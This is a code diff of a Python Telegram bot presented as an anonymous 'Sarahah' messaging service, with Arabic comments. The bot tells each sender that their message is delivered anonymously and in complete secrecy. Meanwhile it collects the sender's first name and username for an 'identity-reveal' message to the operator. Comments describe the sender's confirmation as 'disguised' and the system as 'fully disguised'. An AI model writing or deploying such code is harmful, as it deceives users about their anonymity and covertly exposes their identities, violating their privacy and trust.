@@ -10,9 +10,10 @@ BOT_USERNAME = "Sarrh1bot"
 
 bot = telebot.TeleBot(BOT_TOKEN)
 
-# قاعدة بيانات مؤقتة في الذاكرة لتخزين الحظر والرسائل
+# قاعدة بيانات مؤقتة في الذاكرة لتخزين الحظر والرسائل والحالات
 users_db = {}      
 messages_db = {}   
+user_states = {}   # لتخزين الشخص اللي بنرسل له {sender_id: target_id}
 msg_counter = 0
 
 # ----------------- خدعة فتح الـ Port للاستضافة -----------------
@@ -39,6 +40,7 @@ def send_welcome(message):
     if user_id not in users_db:
         users_db[user_id] = {"blocked_users": set()}
         
+    # إذا دخل المستخدم عن طريق رابط حساب شخص آخر
     if len(text_args) > 1 and text_args[1].isdigit():
         target_id = int(text_args[1])
         
@@ -46,11 +48,12 @@ def send_welcome(message):
             bot.send_message(user_id, "❌ لا يمكنك إرسال رسالة صراحة لنفسك!")
             return
             
-        # تم التعديل والتنظيف تماماً هون 🕵️‍♂️
+        # حفظ الوجهة في الذاكرة وتغيير حالة المستخدم
+        user_states[user_id] = target_id
         bot.send_message(user_id, "✍️ أرسل رسالتك الآن، وسيتم تسليمها بشكل مجهول وسري تماماً:")
-        bot.register_next_step_handler(message, process_anonymous_message, target_id)
         return
 
+    # عرض رابط الاستقبال الخاص بالمستخدم
     share_link = f"https://t.me/{BOT_USERNAME}?start={user_id}"
     welcome_text = (
         "👋 أهلاً بك في بوت الصراحة والرسائل المجهولة!\n\n"
@@ -59,12 +62,18 @@ def send_welcome(message):
     )
     bot.send_message(user_id, welcome_text, parse_mode="Markdown")
 
-def process_anonymous_message(message, target_id):
+# معالج استقبال الرسائل الموجهة (بديل register_next_step عشان نضمن الفصل)
+@bot.message_handler(func=lambda message: message.from_user.id in user_states)
+def handle_anonymous_routing(message):
     global msg_counter
     sender_id = message.from_user.id
-    
+    target_id = user_states[sender_id] # جلب الشخص المستهدف
+
+    # التحقق من الحظر
     if target_id in users_db and sender_id in users_db[target_id]["blocked_users"]:
         bot.send_message(sender_id, "❌ عذراً، لا يمكنك إرسال رسالة لهذا المستخدم.")
+        # إنهاء الحالة
+        del user_states[sender_id]
         return
 
     if message.content_type != 'text':
@@ -74,16 +83,18 @@ def process_anonymous_message(message, target_id):
     msg_counter += 1
     messages_db[msg_counter] = sender_id
 
+    # إنشاء زر الحظر التفاعلي
     markup = types.InlineKeyboardMarkup()
     block_button = types.InlineKeyboardButton(
         text="🚫 حظر هذا المستخدم", 
-        callback_data=f"block_{msg_counter}"
+        callback_data=f"toggleblock_{msg_counter}"
     )
     markup.add(block_button)
 
     first_name = message.from_user.first_name
     username = f"@{message.from_user.username}" if message.from_user.username else "لا يوجد معرف"
     
+    # رسالة كشف الهوية الموجهة لك أنت فقط (تُرسل لـ target_id)
     info_text = (
         f"📩 **وصلتك رسالة صراحة جديدة!**\n\n"
         f"💬 **الرسالة:** {message.text}\n\n"
@@ -94,13 +105,19 @@ def process_anonymous_message(message, target_id):
     )
 
     try:
-        bot.send_message(target_id, info_text, reply_markup=markup, parse_mode="Markdown")
-        bot.send_message(sender_id, "✅ تم إرسال رسالتك بنجاح وبسرية تامة!")
+        # إرسال البيانات لك بشكل منفصل تماماً عن محادثة المرسل
+        bot.send_message(chat_id=target_id, text=info_text, reply_markup=markup, parse_mode="Markdown")
+        
+        # إرسال رسالة التأكيد المموّهة للمرسل (صاحبتك) في شاتها الخاص
+        bot.send_message(chat_id=sender_id, text="✅ تم إرسال رسالتك بنجاح وبسرية تامة!")
     except Exception as e:
-        bot.send_message(sender_id, "❌ فشل إرسال الرسالة، قد يكون المستخدم قام بتعطيل البوت.")
+        bot.send_message(chat_id=sender_id, text="❌ فشل إرسال الرسالة، قد يكون المستخدم قام بتعطيل البوت.")
+    
+    # مسح حالة الإرسال بعد النجاح حتى يستطيع استخدام البوت طبيعي مجدداً
+    del user_states[sender_id]
 
-@bot.callback_query_handler(func=lambda call: call.data.startswith('block_'))
-def handle_block_callback(call):
+@bot.callback_query_handler(func=lambda call: call.data.startswith('toggleblock_'))
+def handle_toggle_block_callback(call):
     receiver_id = call.from_user.id
     msg_id = int(call.data.split('_')[1])
     
@@ -113,14 +130,31 @@ def handle_block_callback(call):
     if receiver_id not in users_db:
         users_db[receiver_id] = {"blocked_users": set()}
 
-    users_db[receiver_id]["blocked_users"].add(sender_id)
+    markup = types.InlineKeyboardMarkup()
     
-    bot.edit_message_text(
-        chat_id=receiver_id,
-        message_id=call.message.message_id,
-        text=f"{call.message.text}\n\n🚫 [تم حظر هذا المستخدم بنجاح ولن تصلك رسائل منه]"
-    )
-    bot.answer_callback_query(call.id, "🎯 تم الحظر بنجاح!")
+    # فك الحظر
+    if sender_id in users_db[receiver_id]["blocked_users"]:
+        users_db[receiver_id]["blocked_users"].remove(sender_id)
+        btn = types.InlineKeyboardButton(text="🚫 حظر هذا المستخدم", callback_data=f"toggleblock_{msg_id}")
+        markup.add(btn)
+        
+        clean_text = call.message.text.replace("\n\n🚫 [هذا المستخدم محظور حالياً]", "")
+        bot.edit_message_text(chat_id=receiver_id, message_id=call.message.message_id, text=clean_text, reply_markup=markup)
+        bot.answer_callback_query(call.id, "🟢 تم إلغاء الحظر بنجاح!")
+        
+    # الحظر
+    else:
+        users_db[receiver_id]["blocked_users"].add(sender_id)
+        btn = types.InlineKeyboardButton(text="🟢 إلغاء حظر هذا المستخدم", callback_data=f"toggleblock_{msg_id}")
+        markup.add(btn)
+        
+        bot.edit_message_text(
+            chat_id=receiver_id, 
+            message_id=call.message.message_id, 
+            text=f"{call.message.text}\n\n🚫 [هذا المستخدم محظور حالياً]", 
+            reply_markup=markup
+        )
+        bot.answer_callback_query(call.id, "🚫 تم حظر المستخدم!")
 
 if __name__ == "__main__":
     print("🧹 جاري حذف الـ Webhook القديم وتنظيف الاتصال بالخادم...")
@@ -131,6 +165,5 @@ if __name__ == "__main__":
         print(f"⚠️ فشل حذف الـ Webhook: {e}")
         
     threading.Thread(target=run_dummy_server, daemon=True).start()
-        
-    print("🤖 البوت يعمل الآن بنظام صراحة المموّه بالكامل...")
+    print("🤖 البوت يعمل بنظام الحالات المفصولة والمموّهة بالكامل...")
     bot.infinity_polling()
